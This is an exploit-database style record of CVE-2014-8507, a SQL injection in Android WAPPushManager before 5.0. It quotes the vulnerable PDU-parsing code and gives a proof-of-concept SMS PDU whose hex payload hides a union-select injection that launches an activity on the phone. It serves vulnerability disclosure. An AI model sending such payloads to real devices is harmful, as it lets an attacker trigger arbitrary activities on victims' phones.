{
    "text": "ecve : CVE-2014-8507 ， title : Android WAPPushManager - SQL Injection - Android dos Exploit ， verified : Not Verified ， exploit_detail : INTRODUCTION ， In Android <5.0 , a SQL injection vulnerability exists in the opt module WAPPushManager , attacker can remotely send malformed WAPPush message to launch any activity or service in the victim's phone ( need permission check )  ， DETAILS ， When a WAPPush message is received , the raw pdu is processed by dispatchWapPdu method in com\\android\\internal\\telephony\\WapPushOverSms.java ， Here the pdu is parsed to get the contentType & wapAppId :  ， String mimeType = pduDecoder.getValueString (  )  ;  ，  * Seek for application ID field in WSP header. ，  * If application ID is found , WapPushManager substitute the message ，  * processing. Since WapPushManager is optional module , if WapPushManager ，  * is not found , legacy message processing will be continued. ，  * / ， index = ( int ) pduDecoder.getValue32 (  )  ;  ， pduDecoder.decodeXWapApplicationId ( index )  ;  ， String wapAppId = pduDecoder.getValueString (  )  ;  ， wapAppId = Integer.toString (  ( int ) pduDecoder.getValue32 (  )  )  ;  ， String contentType = (  ( mimeType == null ) ? ， Long.toString ( binaryContentType )  : mimeType )  ;  ， The wapAppId & contentType can be literal string embeded in the pdu , to prove this , we can launch Android 4.4 emulator and send sms pdu by telnet console ， Type the following command in telnet console :  ， sms pdu 0040000B915121551532F40004800B05040B84C0020003F001010A065603B081EAAF2720756e696f6e2073656c65637420302c27636f6d2e616e64726f69642e73657474696e6773272c27636f6d2e616e64726f69642e73657474696e67732e53657474696e6773272c302c302c302d2d200002066A008509036D6F62696C65746964696E67732E636F6D2F0001 ， And watch the radio log",
    "time": "2014-11-26"
}